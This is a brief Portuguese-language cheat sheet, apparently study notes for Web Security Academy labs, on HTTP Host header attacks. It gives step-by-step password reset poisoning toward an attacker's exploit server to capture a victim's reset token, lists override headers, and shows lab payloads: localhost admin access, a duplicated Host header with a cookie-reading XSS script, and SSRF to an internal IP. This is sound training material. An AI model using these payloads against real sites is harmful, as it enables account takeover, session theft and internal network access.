# Ataques de Host Header

Probabilidade: $${\color{red}alta}$$.

<br>

O melhor lugar para procurar esse tipo de ataque é na funcionalidade de resetar senha (forgot password).

Coloque o endereço do seu servidor de exploit no header **Host** e mude o username para o da vítima.

Em seguida, confira os logs para ver se você recebeu o token de reset.

<br>

Outros Headers possíveis:
```
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```

<br>

## Laboratórios

> [!IMPORTANT]  
> Esse é o Lab mais importante dessa seção.

**Basic Password Reset Poisoning**
```
Host: exploit-server.com
```

<br>
<br>

**Admin Panel from Localhost Only**
```
GET /admin HTTP/1.1
Host: localhost
```

<br>
<br>

**Double Host / Cache poisoning**
```
Host: 0adf00cc033d5f09c05b077d000200eb.web-security-academy.net
Host: "></script><script>alert(document.cookie)</script>
```

<br>
<br>

**SSRF**
```
GET /admin HTTP/1.1
Host: 192.168.0.170
```

<br>
<br>

**SSRF 2**
```
GET https://0a44007e03fb1d0cc0068900005000d1.web-security-academy.net HTTP/1.1
Host: 192.168.0.170
```
